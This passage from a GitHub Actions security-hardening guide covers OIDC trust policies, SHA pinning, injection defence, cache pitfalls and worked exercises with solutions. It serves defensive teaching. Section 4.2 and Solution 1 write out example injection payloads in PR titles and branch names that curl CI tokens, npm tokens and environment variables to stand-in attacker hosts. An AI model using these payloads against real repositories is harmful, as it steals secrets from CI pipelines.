            --image="${IMAGE_DIGEST_REF}" \
            --quiet
```

### 3.4 Scoped Cloud OIDC Trust Policies (`infra/aws-oidc-trust-policy.json` & `infra/gcp-wif-setup.sh`)

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowOrdersApiProductionEnvironment",
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:acme/orders-api:environment:production"
        }
      }
    }
  ]
}
```

When organizations require deployments *only* from an audited centralized reusable workflow regardless of repository branch edits, configure GitHub's custom OIDC `sub` claim customization template (`["repo", "job_workflow_ref", "environment"]`) and verify `job_workflow_ref` in AWS or GCP attribute conditions:

```bash
#!/usr/bin/env bash
set -euo pipefail

PROJECT_ID="acme-staging"
PROJECT_NUM="$(gcloud projects describe "$PROJECT_ID" --format='value(projectNumber)')"
POOL_ID="github-actions"
PROVIDER_ID="github-oidc"
SA_EMAIL="gha-orders-deployer@${PROJECT_ID}.iam.gserviceaccount.com"

gcloud iam workload-identity-pools create "$POOL_ID" \
  --project="$PROJECT_ID" \
  --location="global" \
  --display-name="GitHub Actions OIDC Pool"

gcloud iam workload-identity-pools providers create-oidc "$PROVIDER_ID" \
  --project="$PROJECT_ID" \
  --location="global" \
  --workload-identity-pool="$POOL_ID" \
  --display-name="GitHub OIDC Provider" \
  --issuer-uri="https://token.actions.githubusercontent.com" \
  --attribute-mapping="google.subject=assertion.sub,attribute.actor=assertion.actor,attribute.repository=assertion.repository,attribute.environment=assertion.environment,attribute.ref=assertion.ref" \
  --attribute-condition="assertion.repository=='acme/orders-api' && assertion.environment=='staging' && assertion.ref=='refs/heads/main'"

gcloud iam service-accounts add-iam-policy-binding "$SA_EMAIL" \
  --project="$PROJECT_ID" \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/${PROJECT_NUM}/locations/global/workloadIdentityPools/${POOL_ID}/attribute.repository/acme/orders-api"
```

### 3.5 Automated Action SHA Maintenance: `.github/dependabot.yml`

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "06:00"
      timezone: "UTC"
    groups:
      actions-minor-patch:
        patterns: ["*"]
        update-types: ["minor", "patch"]
```

---

## 4. Complete Construct Reference, Supply Chain Hardening & Edge Cases

### 4.1 Reusable Workflows vs Composite Actions vs Custom JS / Docker Actions

| Construct | Execution Isolation | Supported Runtimes | Secrets & `GITHUB_TOKEN` Control | Best Engineering Fit |
|---|---|---|---|---|
| **Reusable Workflow (`workflow_call`)** | Full separate `jobs:` graph (isolated VM runners) | All YAML job constructs, matrices, `services:` | Separate `permissions:` and explicit `secrets:` per called job | Cross-repo standardized CI/build/deploy orchestration |
| **Composite Action (`action.yml`)** | Inline `steps:` sharing caller VM disk and memory | Bash, pwsh, or nested `uses:` steps | Inherits caller's token; secrets passed explicitly via inputs/env | Toolchain setup, custom cache wrappers, multi-step DRY helpers |
| **Custom JavaScript Action** | Directly on runner host via pinned Node.js (`node20`/`node24`) | Bundled JS (`@actions/core`, `@actions/github`, `esbuild`/`ncc`) | Explicit `inputs:`; zero shell spawning overhead (`0.1s` start) | Fast cross-OS API integrations, artifact parsing, PR checks |
| **Docker Container Action** | Isolated Linux container built from `Dockerfile` or image | Any language/binary packaged inside Linux image | Linux runners only (not supported on `macos`/`windows`) | Heavy binary tooling (`trivy`, custom Go/Rust linters) |

**Custom JavaScript Action Internals**: Unlike composite actions that require explicit `shell: bash` on every `run:`, custom JS actions compile to self-contained bundles (`dist/index.js`, `dist/cleanup.js`) using `esbuild` or `@vercel/ncc` because runners clone the action repository directly without executing `npm install`. Define `main:` plus optional `pre:` and `post:` entrypoints in `action.yml`, and transfer cross-hook state via `core.saveState()` / `core.getState()`:

```yaml
# .github/actions/ephemeral-db/action.yml
name: "Ephemeral Preview DB"
inputs:
  branch_name:
    required: true
outputs:
  db_branch_id:
    description: "Provisioned ephemeral database branch identifier"
runs:
  using: "node20"
  main: "dist/index.js"
  post: "dist/cleanup.js"
  post-if: "always()"
```

```typescript
// src/index.ts — main entrypoint bundled with: esbuild src/index.ts --bundle --platform=node --outfile=dist/index.js
import * as core from "@actions/core";

async function run(): Promise<void> {
  try {
    const branchName = core.getInput("branch_name", { required: true });
    const dbBranchId = `ci-${branchName.replace(/[^a-zA-Z0-9-]/g, "-")}-${Date.now()}`;
    core.saveState("dbBranchId", dbBranchId);
    const connectionUrl = `postgres://ci_user@ephemeral-db.internal:5432/${dbBranchId}`;
    core.setSecret(connectionUrl);
    core.exportVariable("DATABASE_URL", connectionUrl);
    core.setOutput("db_branch_id", dbBranchId);
  } catch (error) {
    core.setFailed(error instanceof Error ? error.message : String(error));
  }
}

void run();
```

```typescript
// src/cleanup.ts — post entrypoint executed automatically even on step failure
import * as core from "@actions/core";

async function cleanup(): Promise<void> {
  const dbBranchId = core.getState("dbBranchId");
  if (!dbBranchId) return;
  core.info(`Deprovisioning ephemeral database branch ${dbBranchId}`);
}

void cleanup();
```

### 4.2 Script Injection Defense (Expression Pre-Evaluation)

GitHub evaluates `${{ ... }}` **textually before spawning the shell (`bash`/`pwsh`) or compiling JS in `actions/github-script`**. Any attacker-controlled metadata interpolated directly inside `run:` or `script:` breaks out of string literals and achieves Remote Code Execution.

#### High-Risk Untrusted Context Fields
- `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.pull_request.head.ref` (branch name!), `github.head_ref`, `github.event.pull_request.head.label`
- `github.event.issue.title`, `github.event.issue.body`, `github.event.comment.body`
- `github.event.review.body`, `github.event.review_comment.body`, `github.event.discussion.title`
- `github.event.commits[*].message`, `github.event.commits[*].author.name`, `github.event.head_commit.message`

```yaml
# VULNERABLE #1 (Bash Injection):
# Attacker opens PR titled: x"; curl -s https://evil.tld/steal -d "$GITHUB_TOKEN" #
- name: Check PR title (VULNERABLE)
  run: echo "Checking ${{ github.event.pull_request.title }}"

# VULNERABLE #2 (JS Injection in actions/github-script):
# Attacker pushes branch named: feat"); process.exit(1); //
- name: Comment branch (VULNERABLE)
  uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
  with:
    script: |
      console.log("Branch: ${{ github.event.pull_request.head.ref }}")

# HARDENED: Bind via env: so values enter via execve process env, never lexical parsing
- name: Check PR title and branch (SAFE)
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    HEAD_REF: ${{ github.event.pull_request.head.ref }}
  uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
  with:
    script: |
      const title = process.env.PR_TITLE ?? "";
      const ref = process.env.HEAD_REF ?? "";
      console.log(`Checking branch=${ref} title=${title}`);
```

### 4.3 Supply Chain Controls: SHA Pinning, `harden-runner` & `GITHUB_TOKEN` Scopes

1. **40-Char Commit SHA Pinning**: Git tags (`@v4`, `@v4.2.2`) are mutable references. If an upstream action repository or maintainer PAT is compromised (such as the March 2025 `tj-actions/changed-files` incident that retroactively repointed historical version tags to dump runner process memory into build logs), every workflow using `@v4` silently executes backdoored code. Pinning the immutable 40-char commit SHA guarantees byte-identical action code unless you explicitly merge a Dependabot PR.
2. **Runner Egress Firewalling (`step-security/harden-runner`)**: Runs as a `pre:` hook deploying an eBPF / iptables DNS+TCP proxy on the runner VM.
   - Start new pipelines in `egress-policy: audit` to inspect every outbound host reached during a full build.
   - Lock security-sensitive release/signing jobs to `egress-policy: block` with an explicit `allowed-endpoints:` list, stopping compromised npm/PyPI dependencies from exfiltrating `GITHUB_TOKEN` or cloud OIDC credentials to attacker endpoints.
3. **Minimal `GITHUB_TOKEN` Permissions Matrix**: Always declare `permissions: {}` at workflow top level and elevate narrowly per job:
   - `contents: read` (git checkout) vs `contents: write` (tag creation, release upload, pushing back commits)
   - `packages: write` (GHCR push)
   - `id-token: write` (OIDC JWT minting for AWS/GCP/Sigstore)
   - `attestations: write` (GitHub artifact attestation API)
   - `pull-requests: write` (posting PR comments/reviews)
   - `security-events: write` (uploading CodeQL/Trivy SARIF reports)

### 4.4 Subtle Edge Cases, Cache Mechanics & Pitfalls

- **Cache Limits, Eviction & Branch Poisoning**:
  - **10 GB per repository limit** (LRU eviction) + automatic eviction after **7 days** of zero access. Unscoped Docker Buildx `type=gha` caches across multiple services rapidly overwrite one another; always attach `scope=${{ inputs.service_name }}`.
  - **Branch Scoping**: Jobs read caches from their **current branch**, the **PR base branch**, or the **default branch (`main`)**—never sibling feature branches. Therefore, if a compromised `main` workflow writes poisoned binaries into cache, *all future PRs inherit that cache*. Disable `restore-keys:` fallback on release/signing jobs.
- **`paths:` / `paths-ignore:` Required Check Deadlock**: If branch protection mandates status check `ci / unit-tests`, and `ci.yml` declares `on: pull_request: paths: ['src/**']`, a docs-only PR editing `README.md` **never triggers `ci.yml`**. GitHub waits forever in `Expected — Waiting for status to be reported`, blocking merge! Either handle path filtering inside the workflow via a fast `changes` gate job (so the required check still reports `success` / skipped gracefully) or gate via `dorny/paths-filter` inside the required workflow.
- **Anti-Recursion Invariant (`GITHUB_TOKEN`)**: Actions executed using the default `GITHUB_TOKEN` (e.g., `release-please` opening a release PR or tagging `v1.4.0`, or a bot committing generated protobuf code) **intentionally do not trigger subsequent `on: push` or `on: pull_request` workflows** to prevent infinite CI loops. Whenever automated commits/PRs must trigger validation checks, authenticate with a fine-grained **GitHub App installation token** (`actions/create-github-app-token`) instead of `GITHUB_TOKEN`.
- **Multi-Line `$GITHUB_OUTPUT` Injection**: Writing untrusted multi-line text using static `EOF` delimiters (`echo "body<<EOF" >> "$GITHUB_OUTPUT"`) allows an attacker string containing `\nEOF\nmalicious=true` to inject arbitrary output keys. Always randomize the heredoc delimiter:
  ```bash
  DELIM="GH_$(openssl rand -hex 16)"
  {
    echo "summary<<${DELIM}"
    printf '%s\n' "$UNTRUSTED_TEXT"
    echo "${DELIM}"
  } >> "$GITHUB_OUTPUT"
  ```
- **Secret Masking Bypass (`::add-mask::`)**: GitHub's log redactor masks exact literal matches of `secrets.*` and `::add-mask::` strings. Printing base64, hex, JSON-escaped, or URL-encoded versions of a secret bypasses log scrubbing and prints plaintext credentials into public build logs. Never serialize secrets into diagnostic echoes or `outputs:`.

---

## 5. Production Debugging, Local CI & Operations Playbook

### 5.1 Static Validation (`actionlint`) & Local Simulation (`act`)

Run `actionlint` in pre-commit hooks and Tier-0 CI to catch expression typos, missing shellcheck guards in `run:`, invalid `needs.*.outputs` names, and deprecated runner labels before pushing broken YAML:

```bash
# Validate all workflows locally with embedded shellcheck and pyflakes checks
actionlint -color -verbose

# Enable debug diagnostics on a failed GitHub run using gh CLI
gh run rerun 123456789 --debug
gh run view 123456789 --log-failed
```

For fast local container debugging of non-OIDC steps, use `nektos/act` (mapping `ubuntu-24.04` to a medium runner image and passing an isolated `.secrets` file):

```bash
act pull_request \
  -W .github/workflows/ci-cd.yml \
  -j lint-and-typecheck \
  -P ubuntu-24.04=catthehacker/ubuntu:act-22.04 \
  --secret-file .secrets.local
```

Note `act` boundaries: `act` cannot mint real GitHub OIDC JWTs (`ACTIONS_ID_TOKEN_REQUEST_URL`), does not enforce GitHub Environment reviewer approvals, and does not emulate `merge_group` queue refs.

### 5.2 Production Failure Triage Playbook

| Symptom | Root Cause | Diagnostic Inspection | Deterministic Remediation |
|---|---|---|---|
| **PR stuck forever at `Expected — Waiting for status to be reported`** | Workflow uses `on: pull_request: paths:` (or `if:` at job level skipped a required check completely) | Check `.github/workflows/*.yml` `paths:` filters vs Repo Settings $\rightarrow$ Rulesets required checks | Remove top-level `paths:`; run a 10s `changes` filter job and keep a stub/pass check with identical job name |
| **Merge Queue PR hangs indefinitely after green PR checks** | Workflow listens to `pull_request:` only and omits `merge_group:` | `grep -rn "merge_group" .github/workflows/` | Add `merge_group: { types: [checks_requested] }` to every workflow providing required status checks |
| **`Error: Not authorized to perform sts:AssumeRoleWithWebIdentity`** | OIDC `sub` claim mismatch (e.g., job added `environment: production`, changing `sub` from `:ref:refs/heads/main` to `:environment:production`) | Inspect workflow `environment:` block and decode JWT claims via AWS CloudTrail `AssumeRoleWithWebIdentity` | Update IAM trust policy `sub` to exact `repo:org/repo:environment:production` matching workflow `environment:` |
| **`Error: No space left on device` during Docker build or Rust compile** | Default hosted Ubuntu VMs reserve ~30 GB for unused `.NET`, Android SDK, Haskell, and pre-cached toolchains | Add `df -h` step before/after build | Add targeted disk cleanup step (`sudo rm -rf /usr/share/dotnet /opt/ghc /usr/local/lib/android`) or attach larger/ARC ephemeral NVMe runners |
| **BuildKit GHA cache misses on every build in a monorepo** | All 10 services write to default unscoped `type=gha`, blowing past 10 GB repo quota and evicting each other via LRU | `gh cache list --sort size_in_bytes --order desc` | Partition every service with `cache-from: type=gha,scope=${{ inputs.service_name }}` and `cache-to: type=gha,mode=max,scope=${{ inputs.service_name }}` |
| **Release-Please / Bot PR fails to start CI status checks** | PR was opened using default `GITHUB_TOKEN`, triggering GitHub's anti-recursion safeguard | Inspect PR author (`github-actions[bot]`) and workflow token source | Mint a short-lived **GitHub App installation token** (`actions/create-github-app-token`) for automated PR/tag creation |
| **Downstream `deploy` job skipped silently when optional test job skipped** | Upstream `needs:` job evaluated `if:` to false (`skipped`), cascading default `success()` skip downstream | Inspect skipped job banner in GitHub UI run graph | Guard downstream job with `if: always() && !failure() && !cancelled() && needs.build.result == 'success'` |

---

## 6. Worked Exercises

### Exercise 1: Full Security Audit (`pull_request_target` + Shell Injection + JS Injection)

Audit this workflow `.github/workflows/pr-helper.yml`, identify every vulnerability, construct two concrete exploit payloads from a public fork PR, and write the remediated two-workflow architecture:

```yaml
name: PR Validator
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Check title
        run: echo "Validating ${{ github.event.pull_request.title }}"
      - name: Run unit tests
        env:
          NPM_TOKEN: ${{ secrets.NPM_PUBLISH_TOKEN }}
        run: |
          npm ci
          npm test
      - name: Comment PR
        uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: "Checks passed for ${{ github.event.pull_request.head.ref }}"
            })
```

### Solution 1

1. **Five Vulnerabilities Identified**:
   - **Critical RCE #1 (`pull_request_target` + Untrusted Checkout)**: Checks out `head.sha` inside a privileged runner holding `secrets.NPM_PUBLISH_TOKEN` and write-capable `GITHUB_TOKEN`, then executes `npm ci && npm test`.
   - **Critical RCE #2 (Bash Expression Injection)**: `${{ github.event.pull_request.title }}` inside `run:` allows arbitrary shell execution before `npm` starts.
   - **Critical RCE #3 (JS Injection in `github-script`)**: `${{ github.event.pull_request.head.ref }}` interpolates directly into JavaScript source before `actions/github-script` parses it.
   - **Missing `permissions:` Lockdown**: Relies on broad repository defaults rather than `permissions: {}` at root.
   - **Mutable Action Tags (`@v4`, `@v7`)**: Vulnerable to upstream tag hijacking.
2. **Concrete Exploit Payloads**:
   - **Payload A (Bash Title Injection)**: Open a fork PR titled `fix"; curl -s https://attacker.tld/exfil -d "npm=$NPM_PUBLISH_TOKEN&gh=$GITHUB_TOKEN" #` (or inject a `postinstall` script inside PR `package.json`).
   - **Payload B (Branch Name JS Injection)**: Push a fork branch named `feat"); require('child_process').execSync('env|base64|curl -d @- https://attacker.tld'); //`.
3. **Remediated Two-Workflow Pattern**:
   - **Workflow 1 (`.github/workflows/pr-tests.yml` — unprivileged `pull_request`)**:

```yaml
name: PR Tests
on:
  pull_request:
    types: [opened, synchronize]

permissions: {}

jobs:
  test:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          [[ "$PR_TITLE" =~ ^(feat|fix|chore|docs): ]] || exit 1
      - run: npm ci --ignore-scripts && npm test
      - env:
          PR_NUM: ${{ github.event.pull_request.number }}
        run: printf '%s\n' "$PR_NUM" > pr_number.txt
      - uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882 # v4.4.3
        with:
          name: pr-metadata
          path: pr_number.txt
```

   - **Workflow 2 (`.github/workflows/pr-comment.yml` — privileged `workflow_run`, zero untrusted checkout)**:

```yaml
name: PR Commenter
on:
  workflow_run:
    workflows: ["PR Tests"]
    types: [completed]

permissions: {}

jobs:
  comment:
    if: github.event.workflow_run.event == 'pull_request' && github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-24.04
    permissions:
      pull-requests: write
    steps:
      - uses: actions/download-artifact@fa0a91b85d4f404e444e00e0059713726501c1f4 # v4.1.8
        with:
          name: pr-metadata
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
        with:
          script: |
            const fs = require('fs');
            const prNum = Number.parseInt(fs.readFileSync('pr_number.txt', 'utf8').trim(), 10);
            if (!Number.isInteger(prNum) || prNum <= 0) {
              throw new Error('Invalid PR number artifact');
            }
            await github.rest.issues.createComment({
              issue_number: prNum,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: 'All unprivileged PR checks passed.'
            });
```

---

### Exercise 2: Migrating Static AWS Keys to Scoped OIDC

A legacy workflow deploys `acme/billing-api` using static `secrets.AWS_ACCESS_KEY_ID` and `secrets.AWS_SECRET_ACCESS_KEY` on pushes to `main`.
1. Write the updated deployment job using AWS OIDC federation, SHA-pinned actions, `environment: production`, and safe concurrency.
2. Write the exact AWS IAM Role Trust Policy restricting access exclusively to `acme/billing-api`'s `production` GitHub Environment, and explain why filtering solely on `repository_owner` (`acme`) fails least-privilege boundaries.

### Solution 2

1. **Hardened OIDC Deployment Job**:

```yaml
permissions: {}

concurrency:
  group: deploy-billing-production
  cancel-in-progress: false

jobs:
  deploy-prod:
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-24.04
    environment:
      name: production
      url: https://billing.acme.internal
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-billing-prod-deploy
          aws-region: us-east-1
      - run: aws ecs update-service --cluster prod --service billing-api --force-new-deployment
```

2. **AWS IAM Trust Policy & Blast Radius Analysis**:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:acme/billing-api:environment:production"
        }
      }
    }
  ]
}
```

Filtering solely on `repository_owner: acme` or `StringLike` `"repo:acme/*"` permits *any* sandbox repo, unreviewed feature branch, or archived repo inside `acme` to assume the production IAM role and compromise production infrastructure. Pairing exact `sub` with GitHub Environment branch restriction (`main` only) and required human reviewers guarantees cryptographic branch and approval binding.

---

### Exercise 3: Reusable Monorepo Docker Buildx Push Workflow

Design `.github/workflows/_docker-build.yml` (`workflow_call`) for a 12-service monorepo that:
1. Accepts `service_name` and `dockerfile_path` inputs.
2. Uses BuildKit GHA caching isolated **per service** (preventing 10 GB global LRU eviction thrashing across all 12 services).
3. Emits an **immutable `@sha256:` digest** as a workflow output, attaches SBOM + SLSA `mode=max` provenance, and authenticates to GHCR with minimal job permissions.

### Solution 3

```yaml
name: Reusable Docker Build & Attest
on:
  workflow_call:
    inputs:
      service_name:
        required: true
        type: string
      dockerfile_path:
        required: true
        type: string
      context_path:
        required: false
        type: string
        default: .
    outputs:
      image-digest:
        description: "Immutable OCI image reference with sha256 digest"
        value: ${{ jobs.build.outputs.image-digest }}

permissions: {}

jobs:
  build:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      packages: write
      id-token: write
    outputs:
      image-digest: ${{ steps.emit.outputs.ref }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: docker/setup-buildx-action@f95db51fddba0c2d1ec667646a06c2ce06100226 # v3.3.0
      - uses: docker/login-action@9780b0c442fcf1117ad29c078b54714114f5b9b4 # v3.3.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: push
        uses: docker/build-push-action@263435318d21b8e681c14492fe198d362a7d2c83 # v6.18.0
        with:
          context: ${{ inputs.context_path }}
          file: ${{ inputs.dockerfile_path }}
          push: true
          tags: ghcr.io/${{ github.repository }}/${{ inputs.service_name }}:${{ github.sha }}
          provenance: mode=max
          sbom: true
          cache-from: type=gha,scope=${{ inputs.service_name }}
          cache-to: type=gha,mode=max,scope=${{ inputs.service_name }}
      - id: emit
        env:
          IMAGE_BASE: ghcr.io/${{ github.repository }}/${{ inputs.service_name }}
          DIGEST: ${{ steps.push.outputs.digest }}
        run: echo "ref=${IMAGE_BASE}@${DIGEST}" >> "$GITHUB_OUTPUT"
```

- `scope=${{ inputs.service_name }}` isolates BuildKit cache keys per service under GitHub's 10 GB repo cap.
- `provenance: mode=max` + `sbom: true` embeds SLSA metadata and SPDX/CycloneDX SBOMs as OCI referrer manifests.
- Downstream deploy jobs consume `${IMAGE_BASE}@${DIGEST}` so Kubernetes/ECS never resolves mutable tags.

---

### Exercise 4: Matrix `fail-fast` Blind Spot & Cache Poisoning Fix

A release CI workflow runs across `[ubuntu-latest, macos-latest, windows-latest]` with:

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, macos-latest, windows-latest]
steps:
  - uses: actions/cache@v4
    with:
      path: ~/.cargo
      key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
      restore-keys: |
        ${{ runner.os }}-cargo-
```

Two incidents occur: (a) a flaky macOS runner timeout cancels Windows before reporting a real Windows linker failure, masking a broken release until post-tag; (b) after a `Cargo.lock` dependency update, a release build restored stale compiled crates from the prior lockfile cache. Diagnose both bugs and provide the hardened configuration.

### Solution 4

1. **Matrix Blind Spot (`fail-fast: true` default)**: Omitting `fail-fast: false` forces GitHub to cancel sibling `windows-latest` and `ubuntu-latest` jobs immediately when `macos-latest` fails—masking deterministic platform linker errors behind transient timeouts.
2. **Stale/Poisoned Cache via `restore-keys:`**: When `Cargo.lock` changed, the exact `key:` missed and `restore-keys: ${{ runner.os }}-cargo-` silently restored compiled artifacts from an older `Cargo.lock` entry. On release/signing pipelines, `restore-keys` breaks lockfile isolation and permits cache poisoning.
3. **Hardened Config**:

```yaml
strategy:
  fail-fast: false
  matrix:
    os: [ubuntu-24.04, macos-14, windows-2022]
steps:
  - uses: actions/cache@6849a6489940f00c2f30c0fb92c62331d9e3d472 # v4.1.2
    with:
      path: ~/.cargo
      key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
  - run: cargo build --release --locked
```

---

### Exercise 5: `paths:` Deadlock, Upstream Skip Cascade & `$GITHUB_OUTPUT` Delimiter Injection

A repository enforces a required branch-protection check named `verify-api` in `.github/workflows/api.yml`:

```yaml
on:
  pull_request:
    paths: ["services/api/**"]
jobs:
  detect:
    runs-on: ubuntu-24.04
    outputs:
      run_heavy: ${{ steps.flag.outputs.run }}
    steps:
      - id: flag
        run: echo "run=false" >> "$GITHUB_OUTPUT"
  heavy-suite:
    needs: [detect]
    if: needs.detect.outputs.run_heavy == 'true'
    runs-on: ubuntu-24.04
    steps:
      - run: npm test
  verify-api:
    needs: [heavy-suite]
    runs-on: ubuntu-24.04
    steps:
      - name: Format PR comment output
        run: |
          echo "summary<<EOF" >> "$GITHUB_OUTPUT"
          echo "${{ github.event.pull_request.title }}" >> "$GITHUB_OUTPUT"
          echo "EOF" >> "$GITHUB_OUTPUT"
```

Diagnose **all three bugs**: (1) why docs-only PRs hang forever waiting for `verify-api`, (2) why `verify-api` skips when `heavy-suite` skips, and (3) how an attacker PR title injects arbitrary step outputs. Provide the fixed workflow.

### Solution 5

1. **Bug 1 (`paths:` Required Check Hang)**: When a PR modifies only `README.md`, `on: pull_request: paths: ["services/api/**"]` prevents the workflow from starting at all. GitHub never receives a conclusion for required check `verify-api`, stalling merge indefinitely. **Fix**: Remove top-level `paths:` and perform path filtering inside `detect` (e.g., via `git diff`).
2. **Bug 2 (Downstream Skip Cascade)**: When `heavy-suite` evaluates `if:` as false (`skipped`), `verify-api` defaults to implicit `success()`, which returns `false` on skipped dependencies—causing `verify-api` to skip and fail/stall required merge checks! **Fix**: Explicitly allow `skipped` while blocking `failure`/`cancelled`: `if: ${{ !failure() && !cancelled() && needs.heavy-suite.result != 'failure' }}` (or `if: always() && (needs.heavy-suite.result == 'success' || needs.heavy-suite.result == 'skipped')`).
3. **Bug 3 (Static `EOF` Injection + `${{ }}` Shell Injection)**: Interpolating `github.event.pull_request.title` directly in `run:` enables Bash RCE, and writing into a static `<<EOF` heredoc allows a newline + `EOF` payload to terminate the output early and forge `GITHUB_OUTPUT` keys. **Fix**: Bind via `env:` and generate a randomized cryptographic delimiter (`openssl rand -hex 16`).

```yaml
on:
  pull_request:
    branches: [main]

permissions: {}

jobs:
  detect:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    outputs:
      run_heavy: ${{ steps.diff.outputs.api_changed }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          fetch-depth: 0
      - id: diff
        run: |
          if git diff --name-only "origin/${GITHUB_BASE_REF}...HEAD" -- services/api/ | grep -q .; then
            echo "api_changed=true" >> "$GITHUB_OUTPUT"
          else
            echo "api_changed=false" >> "$GITHUB_OUTPUT"
          fi

  heavy-suite:
    needs: [detect]
    if: needs.detect.outputs.run_heavy == 'true'
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: npm ci --ignore-scripts && npm test

  verify-api:
    needs: [heavy-suite]
    if: always() && (needs.heavy-suite.result == 'success' || needs.heavy-suite.result == 'skipped')
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - id: format
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          DELIM="GH_$(openssl rand -hex 16)"
          {
            echo "summary<<${DELIM}"
            printf '%s\n' "$PR_TITLE"
            echo "${DELIM}"
          } >> "$GITHUB_OUTPUT"
```

---

### Exercise 6: Automated Release PR CI Deadlock & Ephemeral ARC Isolation

Two production delivery issues occur in a Kubernetes-deployed platform team:
1. A nightly `release-please` workflow runs using `secrets.GITHUB_TOKEN` and opens `chore(main): release 2.4.0`. Required status checks (`ci-cd.yml`) **never run** on that PR, forcing maintainers to close and reopen the PR manually every release.
2. Self-hosted runners execute builds on shared EC2 VMs with `/var/run/docker.sock` mounted; an engineer discovered cached `.aws/credentials` files left behind on disk by an earlier deployment job inside a subsequent untrusted branch build.

Explain the exact root causes and write both fixes (GitHub App token release workflow + ephemeral ARC `AutoscalingRunnerSet` Helm values).

### Solution 6

1. **Root Cause 1 (`GITHUB_TOKEN` Anti-Recursion Suppression)**: GitHub intentionally suppresses downstream `pull_request` and `push` webhook triggers for events emitted using the workflow's built-in `GITHUB_TOKEN` to avoid infinite workflow loops.
   - **Fix**: Authenticate `release-please` with a fine-grained **GitHub App installation token** (`actions/create-github-app-token`, pinned to 40-char SHA), scoped strictly to `contents: write` and `pull-requests: write`. Events authored by the App trigger `pull_request` CI checks normally.
2. **Root Cause 2 (Persistent VM + Shared Docker Socket)**: Persistent EC2 runners never purge `/home/runner` or host Docker daemon state between runs, allowing subsequent branch runs to read leftover IAM temp files or escape via `/var/run/docker.sock`.
   - **Fix**: Migrate to **ARC (`gha-runner-scale-set`)** configured in rootless ephemeral pod mode (`containerMode.type: "kubernetes"` or rootless BuildKit sidecar with zero host Docker socket mount), destroying the pod and writable filesystem immediately after every single job.

```yaml
# .github/workflows/release-pr.yml — Trigger CI checks on automated Release PRs
name: Release PR Automation
on:
  push:
    branches: [main]

permissions: {}

jobs:
  release-please:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - name: Mint short-lived GitHub App token
        id: app-token
        uses: actions/create-github-app-token@5d869da34e18e7287c1daad50e0b8ea0f506ce69 # v1.11.0
        with:
          app-id: ${{ vars.RELEASE_APP_ID }}
          private-key: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}

      - name: Run release-please with App token
        uses: googleapis/release-please-action@16a9c90856f42705d54a6fda1823352bdc62cf38 # v4.4.0
        with:
          token: ${{ steps.app-token.outputs.token }}
          config-file: release-please-config.json
          manifest-file: .release-please-manifest.json
```

```yaml
# helm/arc-runner-scale-set-values.yaml — Ephemeral K8s pod-per-job isolation
githubConfigUrl: "https://github.com/acme/orders-api"
githubConfigSecret: arc-github-app-secret
minRunners: 0
maxRunners: 20

template:
  spec:
    automountServiceAccountToken: false
    containers:
      - name: runner
        image: ghcr.io/actions/actions-runner:2.321.0
        command: ["/home/runner/run.sh"]
        env:
          - name: BUILDKIT_HOST
            value: "tcp://127.0.0.1:1234"
        securityContext:
          allowPrivilegeEscalation: false
          runAsNonRoot: true
          runAsUser: 1001
        resources:
          requests: { cpu: "1000m", memory: "2Gi" }
          limits: { memory: "4Gi" }
      - name: buildkitd
